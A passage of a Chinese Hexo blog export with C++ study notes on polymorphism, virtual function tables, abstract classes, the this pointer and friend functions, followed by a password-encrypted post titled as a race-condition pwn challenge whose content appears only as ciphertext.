<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>多态是针对具体某个函数而言的，称之为多态性。在 C++ 中，一个函数要想具有多态性，必须同时满足以下两个条件：</p>
<ol>
<li>函数是从基类继承而来的，即基类中定义了这个函数，而派生类中又重新定义了这个函数。</li>
<li>函数为动态绑定，这意味着函数的调用版本是在运行时确定的。在 C++ 中，可以使用虚函数来实现动态绑定。</li>
</ol>
<p>第一个条件很好理解，就是我在基类 <code>A</code> 中定义了函数 <code>print</code> ，在它的派生类 <code>B</code> 中我对继承来的函数 <code>print</code> 进行了重写。</p>
<h4 id="静态绑定"><a href="#静态绑定" class="headerlink" title="静态绑定"></a>静态绑定</h4><p>将第二个条件就要提到 C++ 里的静态绑定和动态绑定的概念，静态绑定指的是在编译时就已经可以确定调用的函数版本（也就是确定调用的这个函数属于哪个类中的），这样即使派生类重写了函数，也不会体现出多态的效果，静态绑定可以使程序执行的更快，因为编译器可以在编译时确定函数的调用版本，而不需要在运行时调用。</p>
<p>如下代码， <code>print</code> 函数就为静态绑定</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> : <span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    B b;</span><br><span class="line">    b.<span class="built_in">print</span>();  <span class="comment">// 静态绑定：B::print</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="动态绑定"><a href="#动态绑定" class="headerlink" title="动态绑定"></a>动态绑定</h4><p>动态绑定是函数在调用时确定的具体版本（也就是哪个类中的函数），而非在编译时就确定了。</p>
<p>这是通过指针来调用函数实现的，比如我定义了一个基类 <code>A</code> 的指针为 <code>a</code> ，然后申请了它的派生类 <code>B</code> 大小的空间，将指针 <code>a</code> 指向了申请 <code>B</code> 类的对象地址。这个写成代码应该为 <code>A* a = new B() </code> 。这里其实是我实例化了一个 <code>B</code> 类的对象，然后让指针 <code>a</code> 指向了这个对象的地址，这里之所以 <code>B</code> 后面带 <code>()</code>，是表示调用了 <code>B</code> 类的构造函数来创建 <code>B</code> 类对象。</p>
<p>而上述的情况就会导致，我可以给 <code>a</code> 指针任意赋值其他对象，因为 <code>a</code> 的指针类型为基类,所以我可以随意指向它的派生类，这就导致了我在编译的时候不能确定这个指针到底调用的哪个类中的方法。因此只能等到运行时确定，这就是所谓的动态绑定。</p>
<p>动态绑定的代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;C::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A* a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// 调用的是 B::print()</span></span><br><span class="line">    a = <span class="keyword">new</span> <span class="built_in">C</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// 调用的是 C::print()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052225623.png"></p>
<p><strong>注意</strong>：动态绑定的前提是基类中的函数被 <code>virtual</code> 关键词声明为虚函数才行，如果上述代码将基类中的 <code>virtual</code> 关键词去掉，那么输出结果就为两个 <code>A::print</code> 。因为编译器在处理的时候发现没有 <code>virtual</code> 就不会认为这是虚函数，<strong>从而你使用基类的指针即使调用派生类中的函数依然调用的是基类中的函数，依然不会去考虑指针所指向的对象的实际类型</strong>。</p>
<h4 id="虚函数-amp-amp-虚函数表-amp-amp-虚表指针"><a href="#虚函数-amp-amp-虚函数表-amp-amp-虚表指针" class="headerlink" title="虚函数&amp;&amp;虚函数表&amp;&amp;虚表指针"></a>虚函数&amp;&amp;虚函数表&amp;&amp;虚表指针</h4><p>上面的那段文字中出现了虚函数这个陌生的概念，这里来讲一下动态绑定是如何被实现的。</p>
<p>接下来将提到三个概念，分别是虚函数，虚函数表和虚表指针。</p>
<p>简单解释一下，虚函数表其实就是一个<strong>函数指针数组</strong>（就是存放虚函数指针的一个数组），虚表指针则是指向虚函数表的一个<strong>指针</strong>，虚函数则是被 <code>virtual</code> 关键字声明的函数。</p>
<p>我们考虑一下这个动态绑定，它是一个基类的指针，可以去指向派生类实例后的对象，从而去调用派生类中的函数，并且指向不同的派生类的对象，可以调用同一个函数名但作用不同的函数（这个就是函数的多态性）。具体实现过程如下：</p>
<p>首先在基类A中定义了虚函数，那么这个类A就会拥有一个虚函数表，这个表中会存放基类A中所有的虚函数地址（不是虚函数的话，就不会将地址放到这个虚函数表中）</p>
<p>方便理解，画了个示意图</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052306391.png" alt="image-20230105230622294" style="zoom:50%;" />

<p>然后基类A实例化了一个对象，名为 <code>a</code> ，那么这个对象内部将包含一个虚表指针 <code>*__vptr</code>（这是编译器进行添加的），这个虚表指针就指向了自己这个类的虚函数表。</p>
<p>下面两个图分别是有虚函数和没有虚函数的类，可以看见他们的大小差了八个字节，刚好是64位程序里一个指针的大小，而这个指针就是编译器自动添加的虚表指针。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301052313274.png" alt="image-20230105231306685"></p>
<p><strong>基类中如果存在虚函数表的话，那么派生类则会将虚函数表也继承下来</strong>，如果<u>派生类中没有对基类中的函数进行重新定义，那么虚函数中的函数指针不变，如果派生类对某个基类中的函数进行了重新定义，那么虚函数表中的函数指针将被更新为新的虚函数地址。同样的，派生类实例化后的对象也具有一个虚表指针，来指向派生类自己的虚函数表</u>。</p>
<p>以下面的代码为例，具体说明一下动态绑定的实现过程</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;A::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;B::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123; std::cout &lt;&lt; <span class="string">&quot;C::print&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    A* a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">print</span>();  <span class="comment">// 调用的是 B::print()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先， <code>A* a = new B()</code> 定义了一个类A的指针a（事实上接下来要说的和指针类型没有关系，即使这里是类B指针也完全可以），然后将B类实例化为对象的地址赋值给了 <code>a</code>，所以当前 <code>a</code> 可以通过对象中自己存储的一个 <code>vptr</code> 指针来访问到类B的虚函数表，从而去类B的虚函数中找到 <code>print</code>的函数指针并调用，最终输出 <code>B::print</code> 。</p>
<p><strong>注意：虽然上述操作和 <code>a</code> 指针的类型无关，但是不可以定义为类C的指针（也就是说这个指针的类型要么是基类，要么是当前这个派生类），因为这样会得到一个编译错误。</strong></p>
<h3 id="纯虚函数-amp-amp-抽象类"><a href="#纯虚函数-amp-amp-抽象类" class="headerlink" title="纯虚函数&amp;&amp;抽象类"></a>纯虚函数&amp;&amp;抽象类</h3><p>纯虚函数是一种<strong>虚函数</strong>，它没有实际实现，<strong>只有对函数的声明</strong>。纯虚函数是通过在<strong>函数声明的末尾添加一个 <code>=0</code> 来定义的</strong>，<strong>纯虚函数的目的就是要让基类的派生类去实现它</strong>。</p>
<p>纯虚函数的定义如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>如果单纯的看纯虚函数，感觉这样做似乎没有什么意义。但事实上纯虚函数是为抽象类来服务的，如果一个类中包含了纯虚函数，那么这个类就是抽象类，<strong>抽象类无法被创建对象，它的作用是为其他类提供一个基类</strong>，假如有一个抽象类 <code>Animal</code> ，它定义了一个纯虚函数 <code>makeSound</code> ，之后我们可以创建比如 <code>cat</code> <code>dog</code> 这样的派生类，这样我去每个具体的派生类里面来实现 <code>makeSound</code>。你可以将抽象类理解为某些事物必有的一些特性，而具体的特性又会根据事物的不同而要重新定义，就比如刚刚提到的 <code>makeSound</code> ，在动物中一定都可以发出声音，但是每个动物发出的声音都不一样，因此我们先定义一个抽象类，至于每个动物发出的声音在具体的派生类中再去实现。</p>
<p>下面写一个抽象类与纯虚函数的代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">dog</span>:<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;Wang&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cat</span>:<span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;miao&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Animal *p=<span class="keyword">new</span> <span class="built_in">dog</span>();</span><br><span class="line">	p-&gt;<span class="built_in">makeSound</span>();</span><br><span class="line">	p=<span class="keyword">new</span> <span class="built_in">cat</span>();</span><br><span class="line">	p-&gt;<span class="built_in">makeSound</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061628111.png" alt="image-20230106162845748"></p>
<h3 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h3><p><code>this</code> 指针是类中成员函数的一个隐含参数，每个对象都可以通过 <code>this</code> 指针来访问自己的地址。</p>
<p>这个主要一个用处是可以区分类中的成员和函数局部变量，假如有如下代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="type">int</span> x;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">set_x</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			x=x;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;x is &quot;</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">		&#125;	</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	A a;</span><br><span class="line">	a.<span class="built_in">set_x</span>(<span class="number">60</span>);</span><br><span class="line">	a.<span class="built_in">output_x</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常来说，我们的本意是希望赋值给类中的成员 <code>x</code> ，但是在 <code>set_x</code> 函数中x进行赋值的时候，程序认为是赋值给函数中的局部变量 <code>x</code> 。所以去输出成员变量 <code>x</code> 的时候就发生了错误，如下运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061748632.png" alt="image-20230106174845468"></p>
<p>因此这里我们想强调赋值的是给类中的成员变量 <code>x</code>，就可以写成 <code>this-&gt;x</code>，此时的运行结果就会正常（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061752361.png" alt="image-20230106175223292"></p>
<p><strong>注意：只有在类的成员函数内部才能使用 <code>this</code> ，在其他函数中使用 <code>this</code> 是无效的</strong></p>
<h3 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h3><p>上面提到，如果某个成员变量用 <code>private</code> 进行了修饰，那么就得通过类中定义的公有函数来进行访问，但是有这样一种特殊的函数，<strong>它在类中声明</strong>，具体的定义在类的外面，最关键的是它拥有访问私有（ <code>pritvate</code> ）成员和受保护（<code>protected</code>）成员的特性。这样的函数就叫做<strong>友元函数</strong></p>
<p>代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">int</span> price;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">output_price</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			std::cout &lt;&lt; <span class="string">&quot;price is &quot;</span> &lt;&lt; price &lt;&lt; std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="function"><span class="keyword">friend</span> <span class="type">void</span> <span class="title">set_price</span><span class="params">(A&amp; a,<span class="type">int</span> n)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_price</span><span class="params">(A&amp; a,<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	a.price=n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	A a;</span><br><span class="line">	<span class="built_in">set_price</span>(a,<span class="number">30</span>);<span class="comment">//不需要声明a对象调用了set_price函数</span></span><br><span class="line">	a.<span class="built_in">output_price</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301061935757.png" alt="image-20230106193519661"></p>
<p>可以看见上面的代码中，我并没有在定义的部分写成 <code>A::set_price(A&amp; a,int n)</code>，但依然可以访问到类 <code>A</code> 中的属性。但要注意的是， <code>set_price</code> 函数传参的时候，要提供对象 <code>a</code> 的引用，如果这里仅仅是传递进去了对象 <code>a</code> 那么修改的只是 <code>a</code> 的副本，并没有对原本的实例造成任何改变（函数的参数如果直接传递的是对象，那么仅仅是拷贝一个副本进去）。</p>
<p>关于友元函数有几点需要注意：</p>
<ol>
<li>友元函数不是类的成员函数，因此不能使用类的示例成员访问符 <code>.</code> 或成员指针运算符 <code>-&gt;</code> 来调用友元函数，同样因为这个原因，友元函数也没有 <code>this</code> 指针。</li>
<li>友元函数的声明只能出现在类的定义中，而不能出现在类的实现中。</li>
<li>友元函数可以访问类的所有成员，包括私有成员和公有成员以及受保护成员，因此友元函数不受类的访问控制的限制。</li>
</ol>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/hengyunabc/article/details/7773449">https://blog.csdn.net/hengyunabc/article/details/7773449</a></p>
<p><a href="https://blog.csdn.net/marvie_xie/article/details/79042654">(44条消息) C++学习笔记一：cout如何判断输入数据类型_marvie_xie的博客-CSDN博客_c++判断输入数据类型</a></p>
<p><a href="https://www.runoob.com/cplusplus/cpp-overloading.html">C++ 重载运算符和重载函数 | 菜鸟教程 (runoob.com)</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>关于条件竞争的一道pwn题</title>
    <url>/posts/e0e031bd.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="9dd5b62cf51b48869bb2a4e213da294d01105e027df0226e6a68814f444c7abe">0e96a196e04ab582d32680aaeaf05fdc17ca0dab161dbcdfb87aebd3e10cc06b66c35dd5c42d7eb805acdf59d1a3c9f99f0d2dfce7252f682ef8d4bf3f7116f6558d7f921854cab2e8d33bca9f0d7bc72c5107652ada0fdb708252472ed4c5c9d95e092dab67adff4f8625baaf133c59535f3b8f1bd3cf41d3a0e5b3864ff319a4a85f4d4b3b40b46aa81cf1c197ccc2b96b98caccee5775fbe2b253f90935c6dab7381346507f79948aaf48eda00d87b728383f4258f8df1c62fc4aa8f69b335132c915eff6e0e1515e0dce74e89ff846e24d13a8a5c3ef42373a714a8f8593f81537194eaa543e3c08f753c5cf982ce95e0ab0fc78eb66040635a35422525a05855ab2dbcca6f6aee33d579a3577e8f0b2c917860ec3eb014decadca68bf72fe49eb4f7ae870b209ebb162683b40e5dec34a43deb9748fb6c8e9dcb95a2e8ff856b243fbdfd42d7aac10b19e890b206e1832c2b00a1119699c79d3553823655ba530ea3a979107bac709fe317b24a0e5c59bbd0834f2bc1158205c1bcc4c0199d8fb2bcdbe1cc59c3dd9b7616192966c335734b3e8ab48b3871cfbe9b150efc7f320107587721503ea94f272dfa05c0c12ec832524cdaec099f356f70b99fc80d1e460f6e0e12a7fec030ed101922db4bd6807f258ccc3c8b64b8f12e21f6806381af3922d692040450275a3ffd00642476a964bda011cb6a1e259158d7e3b59ac1819319e74e6f707d87c1482326e3c4fccfd427c9b8bca68121967f613a2c26a2b799b40af1efc4705e4aef397633742e24f48e361d800c7ce8c06ec3c2bd0058c686a28f1125035caf44a4840385f8ebca3f955934a32e5addf1fc9f0ee30f0bcb31ff0dcff98f62dd3bf4f87263046e983c869517f1af737ba803d145f10740ab4ab46ec5312b83b9669a5307a5c0571a2660f40e11c0d3d47da04e6d217ad13a20a01737395a275611a52be8591e2189755c84627aede31a0ce0762d63129a532e087de14da85961cff8f51dad9f500b631936f6363bf2fe6f2c0eb9f7c36d49a178bb5203b503bf52f97d155351461113384ad51d46bcab8a0003899b6a91f683e9ef2b824a654f1f73833d377642b9245375c00abb8980018f4703611c0e11f11b81618105c667049cf77930c2002eb5984fa9cd1972475311dd8229453aea4048e6878e9cab28776edbb3944b3d33f2008ec3b0453c187e1dce1e4754bcf89a4a3d09688512f7e5adbff5e22e4677371c7bf38c1ecce515101e0e879883d738725460a81442233c04c37623251112597b513a7046033592afc2474d7c3fcbb1825e37795f05ec5f6ab646b795e494fb320cd49fcb41259ced0ea1d409c871fc2ad93b94f8333eeb7d85ee2602dd473cd5aa80d53908572fc354e71008e0f6c450cbb94e6bf7a469d3be0e73c2d6e79bb3c486e30d546805a11f7e7622ff9036a78dba28e81a88e899188d9671df9f97c9fc5079e3349429085ec9dc54df43b8b6982b6986dc4674e370d24c9847bede1dd13f6ec3cdc8133d4d38d9968383abdec4a0f0a37fe284bde2a02d78f342a86fd4ef55dc0a60ee00affe42b31ef5c5bb328037a0ccfe4ddc66acb3f0679db5913dd3948dec3e157dcbb601b32a72ad8417cd7ef0fac6a999ff36b45e4511691ff5bef6ab4e218284e9c68d12f0a6962560e325339ccbf471b00d80fab00ed19adfb3b2e02c8cabfa3ecd97143318bc60d5f872f9728262d233e71cf2531c5cef6ceebef665ae54c123c7ef39e4e350ee120a62477972caee377e4ebd8dd589067743e28d804d54dde7b2fff8273e5db09f383e356ecdce81723138af735b009cf78a1dad971da5a3761b015b52d0aba592bba49f54efc9b2b167502e0bef4cd4d2174a56a42f1ad6d17fd768e1568de54fcdba547cf0d3d8915393492f0c24750fabe4130f5a672e27c2061a59f867816131bbd82e1b860a17d129fd5055f502a0eff1819e0056df17892e8693fb3a1eb8b39c70368619bb7b54a95bfa7d357f07bb8baf331e0dad34b544dc82d5a825118a207f4398b4b0786fef42609d3531695631e665cc7c19132d8fd08694d4fcd7a733f74c28da22f2fc20a851b17eb4e37d8cc21d7f9f179d093742652da2ac538f341314fe0dea68561391eb9c1d1bf8e23d389d7d3cacbd0ef2d854a225383c9cd512f1cbf4eb914cbbee1031894b06af8c4b2222cb9df2ff4423204fa8542876a69eee607582c107624d9f72a64328d10d62935f63e7c253d270a9074d3f100bc5328c378e3e44e799fd26e86dba7032b90cf2383e70745b99458971c4647d90c8966337549ec07d6b40a085aab379b3d214923f57cbead8cad721b559d865e2deed166c17b7141e3c3f2d4aeec256fee3b4e4a8d7675d25368e6767e545e2cfc65aa91c495582bea07dda467208da39d019881a4c6c48401235690de88b4bed023a0c608638986f79f68d758f55ddbbbdff8886453db7d37b0e4ad50d2fd167487f5c94948bd304a61b00d020161b98e29f7787b1297e315593cf482b269222fde50ef5c989ffc88def532c1c1fe0ce837ff67ed6fe1c08da8e774b67f016904f4aab66164865fdd244ed0ccada470cc792d760054e3cff28eb15fb1d28cff859db61ac065b72f796ea38bd511e0678c03f93960ca2d40801dde32e35f37eeb5928d3ac4c35648447b6a1ca45c3476dd9770cd12ffdcbc66584912e0c2e6325b9f41feab72bdad62c8fa35727b22e19322f224baf3eee963578eaad643b1de2ee9567e75f9beadc4bcf028d8e176767558119756453b4f7f93d99e9b7a7453f07dabb276af4a0e09ba6aca4e05259be81bf79eccd87ff5ac011c0818a643eeec6d59e432140de4f0d580c1e4a5adb6bec8ba21a450e89e62b14da173a05ee43f620f10d9a1f920ae5740e5a6da833aed4db63fb526f61ed37b710ca5cd2b5cde59f373d0420b094ae3faa9a051dd2540958dddd2ccd1996446fe18cdce921874feab2f882dbea4ba5d80736e397ef653f855b9bff83a48b0846213b01cbe631ceb1f05fb1376bba109f9de62ab0bca542f36ae41c526f70306cf09d041df59ecde9272dc2a7549a9a28fbad9c76781176e8926654e2d2e2fbd1aa992c64362ea3255f1e22d1bc346ce0706965871604f6704ec470e58121235090bcace390130d3f70172eae52e7dd8b19f56b5aa90bc0e0c52d3d5ac1b128cded1ba9494bd4aec564dcd25028500deb1ea2d35e8a74bb15e020d8dac0fab8a417fe36a68a572a20539c9ce27a436b955255409af248105ba013c70ca2c23a747ea0b0bad20fef4f506bb27f786b1f84501b5ffbf5dd7c8e2e1e3ab8756c8ce72aa94727723301625c1ed7eef77eead63c02cf98ff139a57f2a536254269d72bea7c4fbae2b457ff9cf1dc4315836dfe44fc6b2dadd1f864717d7f8bc75eddea7d51b5d48c158c46982bdec6de2071a2091b7cc6aa3795252edc3e5c760bf58782231a41fd2a9e05634a2ac90a94ce8e861d0c31531b36b6d215b684f2aac6021304dd93e56dcb38fb65f1e4cfbd8dc3bc53018bbbaecabe212c1a41fd821528769d8a257719367698d747656203ed70cfb5d071ef153ee232967ae041fc4945e63fd5896d7fdee57a234ea108708d757e1b187e8ff7d70d62b574d351bc5be5ed0bca41f83929b4d1fc82674f4599b01b1904524e8b380877b6336f75d93f0a6298750fdffb0974c5fd41e8795fbf1f505192529aaca6a19df7d1e5eb09c20b043a5c841fc97f2517c52b564bcc18f962e3be244a4eb34d876ffcd7d27c3ace2cecc14a3e452aa887f721f7d44dd84a56c1d1640d6df9d13399d8ad3ae7f7c0e50c5f852ca694c18d4259c308c5cf512fcf171665af922e40fa7d02ba8967a31c43308ea77c8035e2106b8df8fcbe6002024a7d3baafea3d91e62a597ab1f73d1ea8502967f052b10c55fa059051d5cedbadcfa24a0fc0871a6177e40fed8607bfdebc959660643c7e45eb66665f41dd02d8e3bc511d92d146d0e11e5363683554e4855b07e194888bd5b728dac729fb71df32f90ffa456a6c337c38c943f34d964d0bc2d1168b538f4b4a4cde7aac093a83b1b922d4aea51773e290bf309a0bf01ef48ebd201e4c8d460d633317fa932f04d7ae27b595c3599c3316511a2beb64f5828b7a0b31909be24294b93d4e3e4bd2ebd0311e8762bbfafac90422319ed04be30a5902b471d6f058c96564b13e0ef2f27f6ed6ff5d101a499c96a82547ee1720b9d1151275b32a785daab5ef3be55bd1daed429477484729b272b2f26c7dd9f66d41255b449f23d40dd4d8a018952a988478c2661523cc868a2c62d8074e50755cb3eb3d2c7099cb3e2249852d4b9cb6e29b983700ebcb9e9144b0a3941ca7808fb9a040710876bbbda752adaca203058c81d7b0fccb43bb78d2747ed4e27a8393edcf1ee442b1185c36c28b273f5d7c2cf50b73e4ccc083d90bb61174bec9edb989d17baa8bdb5fd1b938ccffbeff9850a785b6d30d537f7e5e367c2d01d2cb7e2efbd7d7ff3f65d0d3a6bdc3749b0cbf2098e3420dc2b32726e8b784ee0a5acddd2526009540fb2a79defdcf5736969686925f1c0a11ba60845554965207bc23f93519e69891c12107574cb6c895ddf6665b3e6d587d141b07c85966d9c4770747e385bb82354ba48019f1f56e3e456430c59c429b184f25ff3b5b6be633028f5a2e59df6c88e8dabbb2aeaf33e7bddc7e89c47ffe4861495c7aae8a1a71de584f3c208f820d6fe9541986a48ffef0a8cabf91a7a049d8702eb9c95fd85543c66ed04310d07a4eb18a3374fd86810f2d3e1fa76e39ad1d00645765239d9c9a0a87d0f9cff2a0d7715233bda7e20bcb34fce66497c115af443e54062285546b416b415ccdcff54b76a5b84622e59e3b6724a8863adb8cfab40cc2a4dda5b4af7c057cdf1fd100e81d4aa734906a6bb3f9ae5995493cb86a0cafdf370cb13e9ec201093b11fd49